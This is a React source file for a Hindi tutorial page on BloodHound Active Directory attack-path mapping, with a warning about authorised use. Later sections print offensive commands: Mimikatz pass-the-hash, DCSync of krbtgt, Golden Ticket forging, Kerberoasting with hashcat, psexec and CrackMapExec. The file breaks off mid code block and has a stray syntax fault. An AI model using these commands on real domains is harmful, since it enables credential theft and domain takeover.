import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Bloodhound() {
  return (
    <TutorialLayout
      title="bloodhound"
      subtitle="Active Directory अटैक पाथ मैपिंग — डोमेन एडमिन तक का shortest path"
      icon="🏹"
      prev={{ to: '/tool/mimikatz', label: 'mimikatz' }}
      next={{ to: '/tool/apktool', label: 'apktool' }}
    >
      <h2>What is BloodHound?</h2>
      <p>
        BloodHound एक शक्तिशाली Active Directory अटैक पाथ मैपिंग टूल है जो Neo4j ग्राफ़ डेटाबेस का उपयोग करके AD का पूरा मैप बनाता है। यह टूल यूज़र्स, ग्रुप्स, कंप्यूटर्स, GPOs, OUs, और उनके बीच के सभी रिलेशनशिप्स को कलेक्ट करके एक विशाल ग्राफ़ में विज़ुअलाइज़ करता है। अटैकर्स और रेड टीम्स इसका उपयोग Domain Admin तक पहुंचने का shortest path खोजने के लिए करती हैं। Blue टीम्स भी इसका उपयोग AD की कमज़ोरियों को पहचानने और ठीक करने के लिए करती हैं।
      </p>
      <p>
        BloodHound को Andy Robbins, Rohan Vazquez, और Will Schroeder ने 2016 में DEF CON 24 में प्रस्तुत किया था। ये तीनों SpecterOps कंपनी के सिक्योरिटी शोधकर्ता हैं। BloodHound ने Active Directory सिक्योरिटी टेस्टिंग को पूरी तरह बदल दिया — पहले जो काम हफ्तों में होता था, अब कुछ ही मिनटों में हो जाता है। यह ओपन सोर्स है और GitHub पर उपलब्ध है।
      </p>
      <p>
        BloodHound का मुख्य सिद्धांत यह है कि Active Directory में जितनी भी एक्सेस कंट्रोल और ग्रुप मेंबरशिप हैं, उन सबको मैनुअली ट्रैक करना लगभग असंभव है। लेकिन ग्राफ़ थ्योरी का उपयोग करके, BloodHound यह काम सेकंडों में कर देता है। यह बताता है कि कौन सा यूज़र किस कंप्यूटर पर एडमिन है, कौन सा ग्रुप किस ग्रुप का मेंबर है, और कौन सी रिलेशनशिप डोमेन एडमिन तक पहुंच बनाती है।
      </p>
      <p>
        BloodHound का इस्तेमाल सिर्फ अटैकर्स ही नहीं, बल्कि डिफेंडर्स भी करते हैं। Blue टीम्स BloodHound से AD की कमज़ोरियों को पहचानती हैं और अटैक पाथ्स को तोड़ती हैं। Purple टीम एक्सरसाइज़ में BloodHound एक essential टूल है जो दोनों तरफ से इस्तेमाल होता है। यह AD security posture assessment का industry standard बन चुका है।
      </p>
      <p>
        BloodHound Community Edition (CE) 2023 में आया जिसने पुराने Neo4j-based आर्किटेक्चर को बदल दिया। नया CE PostgreSQL और internal graph database इस्तेमाल करता है। इसमें Azure AD (Entra ID) सपोर्ट, बेहतर GUI, API access, और Docker-based deployment है। Enterprise edition भी available है जिसमें additional features हैं।
      </p>
      <p>
        BloodHound का impact security industry पर बहुत बड़ा है। OSCP, CRTP, CRTO, और OSEP जैसी certifications में BloodHound knowledge ज़रूरी है। Red team toolchains में यह standard tool बन गया है। Microsoft ने भी AD security improvements किए हैं BloodHound जैसे tools की वजह से — LAPS deployment, tiered admin model, और Kerberos improvements सब BloodHound research से inspired हैं। BloodHound आज 10,000+ GitHub stars के साथ सबसे popular AD security tool है। Internal pentests, red team engagements, और AD security audits में यह mandatory tool है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> BloodHound केवल अधिकृत Red Team ऑपरेशंस और सुरक्षा ऑडिट में ही इस्तेमाल करें। AD रेकन बिना अनुमति के अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत रेकन अपराध हो सकता है। BloodHound डेटा कलेक्शन लॉग्स में दिखाई देता है — बिना अनुमति के उपयोग न करें।
      </div>

      <h2>History of BloodHound</h2>
      <p>
        BloodHound का विकास 2016 में शुरू हुआ जब SpecterOps के शोधकर्ताओं ने महसूस किया कि Active Directory में अटैक पाथ्स खोजना एक जटिल ग्राफ़ समस्या है। उन्होंने DEF CON 24 में "Six Degrees of Domain Admin" नाम से अपना शोध प्रस्तुत किया और BloodHound टूल जारी किया। यह तुरंत लोकप्रिय हो गया।
      </p>
      <p>
        शुरुआत में BloodHound सिर्फ Linux पर चलता था, लेकिन बाद में Windows सपोर्ट भी जोड़ा गया। SharpHound डेटा कलेक्टर C# में लिखा गया ताकि Windows डोमेन में आसानी से चल सके। 2019 में BloodHound 4.0 रिलीज़ हुआ जिसमें कई नई फीचर्स जोड़ी गईं। 2023 में BloodHound Community Edition (CE) रिलीज़ हुआ जो पूरी तरह से नया आर्किटेक्चर है।
      </p>
      <p>
        BloodHound के साथ कई related tools भी आए — AzureHound (Azure AD के लिए), PlumHound (reporting के लिए), और MANSPIDER (file share enumeration के लिए)। SpecterOps ने continuously इसे update किया है। 2021 में BloodHound 4.1 आया जिसमें edge composition features और बेहतर path finding algorithms जोड़ी गईं।
      </p>
      <p>
        BloodHound का impact इतना बड़ा है कि Microsoft ने भी AD security improvements किए हैं। BloodHound ने security community को दिखाया कि AD में कितनी hidden attack paths होती हैं। आज लगभग हर internal penetration test में BloodHound इस्तेमाल होता है। OSCP, CRTP, और अन्य red team certifications में भी BloodHound knowledge ज़रूरी है।
      </p>

      <h2>How BloodHound Works?</h2>
      <p>
        BloodHound का आर्किटेक्चर तीन मुख्य कंपोनेंट्स पर आधारित है — डेटा कलेक्शन, ग्राफ़ डेटाबेस, और विज़ुअलाइज़ेशन। पहले SharpHound डोमेन से डेटा कलेक्ट करता है, फिर Neo4j में स्टोर होता है, और अंत में GUI में अटैक पाथ्स दिखाई देते हैं।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SharpHound (डेटा कलेक्टर):</strong> Windows डोमेन मेंबर मशीन से चलता है। LDAP क्वेरीज़ भेजकर यूज़र्स, ग्रुप्स, कंप्यूटर्स, सेशंस, ACLs कलेक्ट करता है। ZIP फाइल आउटपुट देता है</li>
        <li><strong className="text-white">Neo4j (ग्राफ़ डेटाबेस):</strong> सभी डेटा ग्राफ़ फॉर्मेट में स्टोर होता है। Nodes = यूज़र्स, ग्रुप्स, कंप्यूटर्स। Edges = रिलेशनशिप्स (MemberOf, AdminTo, HasSession, etc.)</li>
        <li><strong className="text-white">BloodHound GUI:</strong> Electron-based एप्लिकेशन जो ग्राफ़ विज़ुअलाइज़ करता है। प्री-बिल्ट क्वेरीज़ से एक क्लिक में अटैक पाथ्स दिखाता है</li>
        <li><strong className="text-white">Cypher Queries:</strong> Neo4j की क्वेरी लैंग्वेज जिससे कस्टम क्वेरीज़ लिखी जा सकती हैं</li>
      </ul>
      <p>
        BloodHound CE (Community Edition) में architecture बदल गया है। अब Neo4j की जगह internal graph database use होती है। PostgreSQL metadata store करता है। Docker-based deployment से installation आसान हो गई है। CE में API access भी है जिससे automated queries run कर सकते हो।
      </p>
      <p>
        SharpHound collection methods तीन तरह के हैं: Default (सब data), Stealth (कम detectable), और Loop (continuous collection)। Loop mode में SharpHound continuously session changes track करता है — यह real-time attack planning में useful है। Collection methods: Group, Session, Trusts, ACL, ObjectProps, Container, GPOLocalGroup, RDP, DCOM, PSRemote।
      </p>

      <h2>Installation</h2>
      <p>
        BloodHound इंस्टॉल करने के लिए Neo4j डेटाबेस और BloodHound GUI दोनों चाहिए। Kali Linux में यह प्री-इंस्टॉल्ड आता है। SharpHound Windows मशीन पर अलग से चलाना होता है।
      </p>
      <CodeBlock
        title="BloodHound इंस्टॉल करें"
        code={`# Kali Linux में प्री-इंस्टॉल्ड होता है:
sudo apt update
sudo apt install bloodhound

# Neo4j इंस्टॉल करें (अगर नहीं है):
sudo apt install neo4j

# सोर्स से इंस्टॉल:
git clone https://github.com/BloodHoundAD/BloodHound.git
cd BloodHound
npm install
npm run build

# Docker से इंस्टॉल:
docker pull specterops/bloodhound
docker run -d -p 7474:7474 -p 7687:7687 specterops/bloodhound

# SharpHound डाउनलोड करें (Windows के लिए):
# GitHub Releases से SharpHound.exe डाउनलोड करें

# Python वर्जन (BloodHound.py):
pip install bloodhound
bloodhound-python -d target.local -u user -p password -c All`}
      />
      <CodeBlock
        title="BloodHound CE Docker Compose Install"
        code={`# BloodHound CE — recommended installation method:
# docker-compose.yml बनाओ:
# version: '3'
# services:
#   bloodhound:
#     image: specterops/bloodhound:latest
#     ports:
#       - "8080:8080"
#     environment:
#       - NEO4J_URI=bolt://neo4j:7687
#       - NEO4J_USER=neo4j
#       - NEO4J_PASSWORD=bloodhound
#   neo4j:
#     image: neo4j:5
#     ports:
#       - "7474:7474"
#       - "7687:7687"
#     environment:
#       - NEO4J_AUTH=neo4j/bloodhound

# Start करो:
docker compose up -d

# Browser में open करो:
# http://localhost:8080
# Default credentials: admin / admin (पहली बार change करो)

# AzureHound install (Azure AD के लिए):
# GitHub से download करो:
# https://github.com/BloodHoundAD/AzureHound/releases`}
      />
      <CodeBlock
        title="BloodHound on Windows"
        code={`# Windows पर BloodHound CE:
# Docker Desktop install करो पहले
# फिर docker compose up -d चलाओ

# SharpHound Windows पर:
# PowerShell (Admin) में:
# Import-Module .\\SharpHound.ps1
# Invoke-BloodHound -CollectionMethod All

# या exe version:
# SharpHound.exe -c All

# या C# version:
# .\\SharpHound.exe -c All --outputdirectory C:\\BH

# Linux से bloodhound-python:
pip install bloodhound
bloodhound-python -d corp.local -u svc_bh -p 'Password123' -c All -ns 10.0.0.1`}
      />

      <h2>Data Collection (SharpHound)</h2>
      <p>
        SharpHound BloodHound का डेटा कलेक्टर है। यह Windows डोमेन मेंबर मशीन से चलता है और LDAP क्वेरीज़ के ज़रिए AD का पूरा डेटा कलेक्ट करता है। यह .NET में लिखा गया है और डोमेन जॉइन्ड मशीन से चलाना सबसे आसान है।
      </p>
      <CodeBlock
        title="SharpHound Data Collection"
        code={`# सभी डेटा कलेक्ट करो:
SharpHound.exe -c All

# स्पेसिफिक कलेक्शन मेथड्स:
SharpHound.exe -c Group,Session,ACL

# लूप मोड — कंटीन्यूअस कलेक्शन (2 घंटे):
SharpHound.exe -c All --loop --loopduration 02:00:00

# हर 10 मिनट में:
SharpHound.exe -c All --loop --loopduration 01:00:00 --loopsession 10

# डोमेन स्पेसिफाई करें:
SharpHound.exe -c All -d target.local

# आउटपुट डायरेक्ट्री:
SharpHound.exe -c All --outputdirectory C:\\temp

# स्टील्थ मोड (कम डिटेक्शन):
SharpHound.exe -c All --stealth

# थर्ड पार्टी सर्वर से कलेक्ट:
SharpHound.exe -c All --domaincontroller dc01.target.local

# ZIP फाइल जनरेट होगी — उसे BloodHound में इम्पोर्ट करो`}
      />

      <h2>Important Options Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Flag</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c All</td><td className="py-2 px-3">सभी डेटा कलेक्ट करें (सबसे कंप्लीट)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c Group</td><td className="py-2 px-3">ग्रुप मेंबरशिप कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c Session</td><td className="py-2 px-3">एक्टिव लॉगिन सेशंस कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c ACL</td><td className="py-2 px-3">एक्सेस कंट्रोल लिस्ट्स कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c Trusts</td><td className="py-2 px-3">डोमेन ट्रस्ट्स कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c GPOLocalGroup</td><td className="py-2 px-3">GPO लोकल ग्रुप पॉलिसी कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c ObjectProps</td><td className="py-2 px-3">ऑब्जेक्ट प्रॉपर्टीज़ कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c LoggedOn</td><td className="py-2 px-3">लॉग्ड-ऑन यूज़र्स कलेक्ट करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--stealth</td><td className="py-2 px-3">स्टील्थ मोड — कम डिटेक्शन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--loop</td><td className="py-2 px-3">कंटीन्यूअस कलेक्शन मोड</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d</td><td className="py-2 px-3">स्पेसिफिक डोमेन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--outputdirectory</td><td className="py-2 px-3">आउटपुट डायरेक्ट्री</td></tr>
          </tbody>
        </table>
      </div>

      <h2>BloodHound Setup</h2>
      <p>
        BloodHound GUI शुरू करने से पहले Neo4j डेटाबेस चालू होना चाहिए। Neo4j ग्राफ़ डेटाबेस है जो सारा AD डेटा स्टोर करता है।
      </p>
      <CodeBlock
        title="Neo4j और BloodHound शुरू करें"
        code={`# स्टेप 1: Neo4j शुरू करें:
sudo neo4j console

# अगर सर्विस के तौर पर चलाना है:
sudo systemctl start neo4j

# स्टेप 2: ब्राउज़र में Neo4j खोलें:
# http://localhost:7474
# डिफ़ॉल्ट लॉगिन: neo4j / neo4j
# पासवर्ड बदलो (ज़रूरी है!)

# स्टेप 3: BloodHound शुरू करें:
bloodhound

# या डायरेक्ट:
# /usr/share/bloodhound/BloodHound-linux-x64/BloodHound

# स्टेप 4: Neo4j क्रेडेंशियल्स से लॉगिन करो
# SharpHound की ZIP फाइल ड्रैग & ड्रॉप करो
# डेटा इम्पोर्ट हो जाएगा`}
      />

      <h2>Pre-Built Queries</h2>
      <p>
        BloodHound GUI में Analysis टैब में प्री-बिल्ट क्वेरीज़ हैं जो एक क्लिक में अटैक पाथ्स दिखाती हैं। ये क्वेरीज़ ग्राफ़ थ्योरी का उपयोग करके shortest path खोजती हैं।
      </p>
      <CodeBlock
        title="Built-in Queries"
        code={`# BloodHound GUI में Analysis टैब:

# SHORTCUTS TO DOMAIN ADMIN:
# "Find all Domain Admins" — Domain Admins की लिस्ट
# "Find Shortest Paths to Domain Admin" — अटैक पाथ्स
# "Find Shortest Paths to Domain Admin from Kerberoastable Users"
# "Find Shortest Paths from Kerberoastable Users"

# PRINCIPALS WITH RIGHTS:
# "Find Principals with DCSync Rights" — DCSync capable यूज़र्स
# "Find All Kerberoastable Users" — Kerberoast टार्गेट्स
# "Find AS-REP Roastable Users" — AS-REP टार्गेट्स
# "Find Principals with Foreign Domain Group Membership"

# COMPUTER TARGETS:
# "Find Computers with Unsupported Windows OS"
# "Find Computers where Domain Users are Local Admin"
# "Find Computers where Domain Users can RDP"

# ग्रुप क्वेरीज़:
# "Find All Groups with WriteDACL"
# "Find All Groups with GenericAll"
# "Find Groups with Foreign Domain Membership"

# हर क्वेरी एक ग्राफ़ दिखाती है nodes और edges के साथ
# Nodes = यूज़र्स, ग्रुप्स, कंप्यूटर्स
# Edges = रिलेशनशिप्स (MemberOf, AdminTo, etc.)

# AZURE AD QUERIES (CE):
# "Find Azure Global Admins"
# "Find Azure VM Admin Login Users"
# "Find Hybrid Paths to Azure"

# CERTIFICATE QUERIES (CE):
# "Find ADCS ESC1 Vulnerable Templates"
# "Find ADCS ESC9a Vulnerable Templates"

# TRUST QUERIES:
# "Find All Trust Relationships"
# "Find Cross-forest Attack Paths"

# DELEGATION QUERIES:
# "Find Computers with Unconstrained Delegation"
# "Find Computers with Constrained Delegation"

# OWNERSHIP QUERIES:
# "Find All Objects Owned by Users"
# "Find Principals with Ownership"')}
      />

      <h2>Attack Paths (Step-by-Step)</h2>
      <div className="space-y-3 mt-4">
        {[
          { step: '1', title: 'Data Collect', desc: 'SharpHound से डोमेन का डेटा कलेक्ट करो — यूज़र्स, ग्रुप्स, सेशंस, ACLs, Trusts' },
          { step: '2', title: 'Import', desc: 'BloodHound GUI में ZIP फाइल इम्पोर्ट करो — Neo4j ग्राफ़ डेटाबेस में स्टोर होगा' },
          { step: '3', title: 'Query', desc: 'प्री-बिल्ट क्वेरीज़ से अटैक पाथ्स ढूंढो — shortest path to Domain Admin' },
          { step: '4', title: 'Analyze', desc: 'हर node और edge को समझो — कौन सा यूज़र कहाँ एडमिन है' },
          { step: '5', title: 'Exploit', desc: 'अटैक पाथ फॉलो करो — हर node पर एक्सप्लॉइट टेक्निक अप्लाई करो' },
          { step: '6', title: 'Document', desc: 'सभी फाइंडिंग्स डॉक्यूमेंट करो — रिपोर्ट में अटैक पाथ दिखाओ' },
        ].map(item => (
          <div key={item.step} className="flex items-start space-x-4 glass-card p-4">
            <div className="flex-shrink-0 w-10 h-10 bg-neon-green/10 border border-neon-green/30 rounded-full flex items-center justify-center text-neon-green font-heading font-bold">
              {item.step}
            </div>
            <div>
              <h4 className="text-white font-mono font-semibold">{item.title}</h4>
              <p className="text-gray-500 text-sm">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>

      <h2 className="mt-8">Key Relationships Table</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Edge</th>
              <th className="text-left py-2 px-3 text-neon-green">मतलब</th>
              <th className="text-left py-2 px-3 text-neon-green">एक्सप्लॉइट</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">MemberOf</td><td className="py-2 px-3">ग्रुप मेंबरशिप</td><td className="py-2 px-3">ग्रुप पॉलिसी एब्यूज</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AdminTo</td><td className="py-2 px-3">लोकल एडमिन एक्सेस</td><td className="py-2 px-3">लैटरल मूवमेंट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HasSession</td><td className="py-2 px-3">एक्टिव लॉगिन सेशन</td><td className="py-2 px-3">टोकन इम्पर्सनेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CanRDP</td><td className="py-2 px-3">RDP एक्सेस</td><td className="py-2 px-3">रिमोट डेस्कटॉप</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">DCSync</td><td className="py-2 px-3">DCSync राइट्स</td><td className="py-2 px-3">हैश डंप (Mimikatz)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ForceChangePassword</td><td className="py-2 px-3">पासवर्ड बदलने का अधिकार</td><td className="py-2 px-3">एडमिन पासवर्ड रीसेट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">GenericAll</td><td className="py-2 px-3">पूरा कंट्रोल</td><td className="py-2 px-3">SPN सेट करो, पासवर्ड रीसेट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">WriteDacl</td><td className="py-2 px-3">DACL में बदलाव</td><td className="py-2 px-3">अपने आप को एडमिन बनाओ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AddMember</td><td className="py-2 px-3">ग्रुप में मेंबर जोड़ना</td><td className="py-2 px-3">ग्रुप में खुद को जोड़ो</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">AllowedToDelegate</td><td className="py-2 px-3">डेलिगेशन राइट्स</td><td className="py-2 px-3">कॉन्स्ट्रेंड डेलिगेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HasSIDHistory</td><td className="py-2 px-3">SID हिस्ट्री</td><td className="py-2 px-3">SID हिस्ट्री इंजेक्शन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GPLink</td><td className="py-2 px-3">GPO लिंक</td><td className="py-2 px-3">GPO मैनिपुलेशन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Owns</td><td className="py-2 px-3">ऑब्जेक्ट ओनरशिप</td><td className="py-2 px-3">ACL मैनिपुलेशन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GetChanges</td><td className="py-2 px-3">DCSync पार्ट 1</td><td className="py-2 px-3">पासवर्ड हैश एक्सट्रैक्ट</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GetChangesAll</td><td className="py-2 px-3">DCSync पार्ट 2</td><td className="py-2 px-3">सभी हैशेस डंप</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">AllowedToAct</td><td className="py-2 px-3">रिसोर्स-बेस्ड कॉन्स्ट्रेंड डेलिगेशन</td><td className="py-2 px-3">S4U अटैक</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">SQLAdmin</td><td className="py-2 px-3">SQL Server एडमिन</td><td className="py-2 px-3">xp_cmdshell</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">HasSIDHistory</td><td className="py-2 px-3">SID हिस्ट्री</td><td className="py-2 px-3">SID हिस्ट्री इंजेक्शन</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Contains</td><td className="py-2 px-3">OU कंटेनमेंट</td><td className="py-2 px-3">GPO स्कोपिंग</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">GpLink</td><td className="py-2 px-3">GPO लिंक</td><td className="py-2 px-3">GPO एनफोर्समेंट</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">TrustedBy</td><td className="py-2 px-3">ट्रस्ट रिलेशनशिप</td><td className="py-2 px-3">क्रॉस-डोमेन अटैक</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Custom Cypher Queries</h2>
      <p>
        BloodHound GUI में Cypher टैब में कस्टम क्वेरीज़ लिख सकते हो। Neo4j की क्वेरी लैंग्वेज बहुत पावरफुल है। ये कुछ उपयोगी क्वेरीज़ हैं:
      </p>
      <CodeBlock
        title="Cypher Queries"
        code={`# सभी Domain Admins ढूंढो:
MATCH (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"})
MATCH (n)-[:MemberOf*1..]->(g)
RETURN n.name, n.enabled

# कौन सा यूज़र किस कंप्यूटर पर एडमिन है:
MATCH p=shortestPath((u:User)-[:AdminTo*1..]->(c:Computer))
RETURN u.name, c.name, length(p)

# Kerberoastable यूज़र्स:
MATCH (u:User {hasspn:true})
WHERE NOT u.name STARTS WITH 'KRBTGT'
RETURN u.name, u.serviceprincipalnames

# AS-REP रोस्टेबल यूज़र्स:
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

# DCSync राइट्स वाले:
MATCH p=shortestPath((n)-[:GetChanges|GetChangesAll*1..]->(d:Domain))
RETURN n.name

# सभी फॉरेन ग्रुप मेंबर्स:
MATCH (n)-[:MemberOf]->(g:Domain {name: "OTHERDOMAIN.LOCAL"})
RETURN n.name, g.name

# सबसे छोटा पाथ Domain Admin तक:
MATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}))
RETURN p

# सभी कंप्यूटर्स जहाँ Domain Users एडमिन हैं:
MATCH (g:Group {name:"DOMAIN USERS@TARGET.LOCAL"})
MATCH (g)-[:AdminTo]->(c:Computer)
RETURN c.name`}
      />

      <h2>BloodHound CE (Community Edition)</h2>
      <p>
        2023 में SpecterOps ने BloodHound Community Edition (CE) रिलीज़ किया। यह पूरी तरह से नया आर्किटेक्चर है — अब Neo4j की जगह PostgreSQL और graph database इंटरनली इस्तेमाल होता है। Docker-based डिप्लॉयमेंट है और बहुत बेहतर परफॉर्मेंस देता है।
      </p>
      <p>
        CE और legacy BloodHound में सबसे बड़ा फ़र्क backend architecture है। Legacy version में Neo4j + Electron GUI था जो memory-intensive था। CE में PostgreSQL + Go backend है जो lightweight और faster है। CE में Azure AD (Entra ID) support built-in है — hybrid environments में on-premises और cloud दोनों map होते हैं। CE API-first design है — GUI भी API पर built है, इसलिए automation आसान है।
      </p>
      <p>
        CE में new edge types भी हैं — ADCSESC1, ADCSESC9a, WriteGPLink, SyncedToEntraUser जैसे edges AD Certificate Services और Azure AD attacks cover करते हैं। Edge composition feature से multiple edges combine करके complex attack paths दिखती हैं। CE recommended है सभी new deployments के लिए।
      </p>
      <CodeBlock
        title="BloodHound CE Install"
        code={`# Docker Compose से इंस्टॉल:
git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound
docker compose up -d

# डिफ़ॉल्ट लॉगिन:
# URL: http://localhost:8080
# Admin: admin
# पासवर्ड: डिफ़ॉल्ट पासवर्ड चेंज करो

# नए SharpHound CE का उपयोग:
# GitHub Releases से SharpHound CE डाउनलोड करो
SharpHound.exe -c All

# या BloodHound.py:
pip install bloodhound
bloodhound-python -d target.local -u user -p password -c All

# नए फीचर्स:
# - बेहतर परफॉर्मेंस
# - Azure AD सपोर्ट
# - नई एज टाइप्स
# - बेहतर GUI
# - API सपोर्ट`}
      />

      <h2>Scripting & Automation</h2>
      <p>
        BloodHound को स्क्रिप्ट्स से ऑटोमेट कर सकते हो। SharpHound को शेड्यूल करो, क्वेरीज़ ऑटोमेट करो, और रिपोर्ट्स जनरेट करो।
      </p>
      <CodeBlock
        title="Automation Scripts"
        code={`# SharpHound ऑटोमेशन (Windows PowerShell):
# डेली स्कैन शेड्यूल करो:
$task = New-ScheduledTaskTrigger -Daily -At "2:00AM"
Register-ScheduledTask -Trigger $task -User "DOMAIN\\svc_bloodhound" -TaskName "BH-Scan" -Action (New-ScheduledTaskAction -Execute "C:\\Tools\\SharpHound.exe" -Argument "-c All --outputdirectory C:\\BH\\Data")

# Linux से Python ऑटोमेशन:
# bloodhound-python इंस्टॉल:
pip install bloodhound

# ऑटोमेटिक कलेक्शन:
bloodhound-python -d target.local -u svc_bloodhound -p 'Password123' -c All -ns 10.0.0.1

# Neo4j Cypher कमांड लाइन से:
echo "MATCH (n) RETURN count(n)" | cypher-shell -u neo4j -p password

# Neo4j डेटाबेस क्लियर करो:
echo "MATCH (n) DETACH DELETE n" | cypher-shell -u neo4j -p password

# रिपोर्ट जनरेशन (bloodhound-cli):
# CE वर्जन में API से रिपोर्ट जनरेट करो`}
      />
      <CodeBlock
        title="Bulk Cypher Query Runner"
        code={`# एक साथ कई क्वेरीज़ चलाओ और CSV में सेव करो:
# queries.cypher फाइल बनाओ:
# MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
# MATCH (u:User {dontreqpreauth:true}) RETURN u.name
# MATCH (n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name

# Cypher queries रन करो:
cat queries.cypher | cypher-shell -u neo4j -p password --format plain > results.txt

# Python से automated reporting:
python3 -c "
from neo4j import GraphDatabase
driver = GraphDatabase.driver('bolt://localhost:7687', auth=('neo4j','password'))
with driver.session() as session:
    result = session.run('MATCH (u:User {hasspn:true}) RETURN u.name')
    for record in result:
        print(record['u.name'])
driver.close()
"`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        BloodHound real-world penetration tests और red team engagements में बहुत effectively इस्तेमाल होता है। यहाँ कुछ common scenarios हैं जहाँ BloodHound critical findings निकालता है।
      </p>
      <p>
        एक typical internal pentest में, tester को domain-joined machine मिलती है। SharpHound चलाने के बाद BloodHound दिखाता है कि Domain Admin group का कौन सा member किसी workstation पर logged in है। उस workstation पर local admin access मिलते ही, tester उस user का token impersonate करके Domain Admin बन जाता है। यह attack path manually खोजना लगभग असंभव है।
      </p>
      <p>
        एक और common scenario है — Kerberoastable service accounts। BloodHound दिखाता है कि कौन से user accounts के SPN set हैं। इन accounts के TGS hashes crack करके, attacker को service account का password मिल जाता है। अगर वह service account Domain Admin है (जो अक्सर होता है), तो domain compromise हो जाता है। BloodHound यह पूरा path visually दिखाता है।
      </p>
      <CodeBlock
        title="Common Attack Scenario"
        code={`# स्टेप 1: डोमेन मेंबर मशीन से SharpHound चलाओ
SharpHound.exe -c All --loop --loopduration 02:00:00

# स्टेप 2: BloodHound में इम्पोर्ट करो
# ZIP फाइल drag & drop करो

# स्टेप 3: "Find Shortest Paths to Domain Admin" क्वेरी चलाओ
# अटैक पाथ दिखेगा:
# User A -> AdminTo -> Workstation1 -> HasSession -> DomainAdmin

# स्टेप 4: Mimikatz से token impersonate करो
# Workstation1 पर:
sekurlsa::pth /user:DomainAdmin /domain:target.local /ntlm:hash

# स्टेप 5: Domain Admin access मिल गया!
# psexec से DC पर access:
psexec \\\\dc01.target.local cmd.exe`}
      />

      <h2>Integration with Other Tools</h2>
      <p>
        BloodHound अकेले इस्तेमाल करने से ज़्यादा, दूसरे tools के combination में powerful है। Red team toolchains में BloodHound reconnaissance का starting point है।
      </p>
      <CodeBlock
        title="BloodHound + Mimikatz Combo"
        code={`# BloodHound से Kerberoastable users ढूंढो
# फिर Mimikatz से TGS request करो:

# Mimikatz में:
kerberos::list /export
# या Invoke-Kerberoast PowerShell से:
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt

# Hashcat से crack करो:
hashcat -m 13100 hashes.txt rockyou.txt

# BloodHound से DCSync rights वाले users ढूंढो
# फिर Mimikatz से DCSync:
lsadump::dcsync /domain:target.local /user:krbtgt
# Golden Ticket बनाओ:
kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash /ptt`}
      />
      <CodeBlock
        title="BloodHound + CrackMapExec Combo"
        code={`# BloodHound से "Computers where Domain Users are Local Admin" ढूंढो
# फिर CrackMapExec से lateral movement:

# सभी कंप्यूटर्स पर local admin access check करो:
crackmapexec smb 192.168.1.0/24 -u user -p password

# जहाँ access मिले, वहाँ secrets dump करो:
